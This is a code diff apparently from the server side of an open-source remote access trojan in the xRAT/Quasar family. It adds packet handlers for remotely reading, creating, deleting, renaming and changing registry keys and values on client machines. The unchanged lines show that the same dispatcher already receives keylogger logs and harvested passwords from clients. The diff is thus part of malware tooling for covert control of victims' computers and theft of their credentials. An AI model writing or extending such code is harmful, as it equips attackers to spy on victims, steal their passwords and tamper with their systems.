@@ -66,6 +66,38 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetKeyloggerLogsResponse(client, (ClientPackets.GetKeyloggerLogsResponse)packet);
             }
+            else if (type == typeof(ClientPackets.GetRegistryKeysResponse))
+            {
+                CommandHandler.HandleLoadRegistryKey((ClientPackets.GetRegistryKeysResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetCreateRegistryKeyResponse))
+            {
+                CommandHandler.HandleCreateRegistryKey((ClientPackets.GetCreateRegistryKeyResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetDeleteRegistryKeyResponse))
+            {
+                CommandHandler.HandleDeleteRegistryKey((ClientPackets.GetDeleteRegistryKeyResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetRenameRegistryKeyResponse))
+            {
+                CommandHandler.HandleRenameRegistryKey((ClientPackets.GetRenameRegistryKeyResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetCreateRegistryValueResponse))
+            {
+                CommandHandler.HandleCreateRegistryValue((ClientPackets.GetCreateRegistryValueResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetDeleteRegistryValueResponse))
+            {
+                CommandHandler.HandleDeleteRegistryValue((ClientPackets.GetDeleteRegistryValueResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetRenameRegistryValueResponse))
+            {
+                CommandHandler.HandleRenameRegistryValue((ClientPackets.GetRenameRegistryValueResponse)packet, client);
+            }
+            else if (type == typeof(ClientPackets.GetChangeRegistryValueResponse))
+            {
+                CommandHandler.HandleChangeRegistryValue((ClientPackets.GetChangeRegistryValueResponse)packet, client);
+            }
             else if (type == typeof(ClientPackets.GetPasswordsResponse))
             {
                 CommandHandler.HandleGetPasswordsResponse(client, (ClientPackets.GetPasswordsResponse)packet);
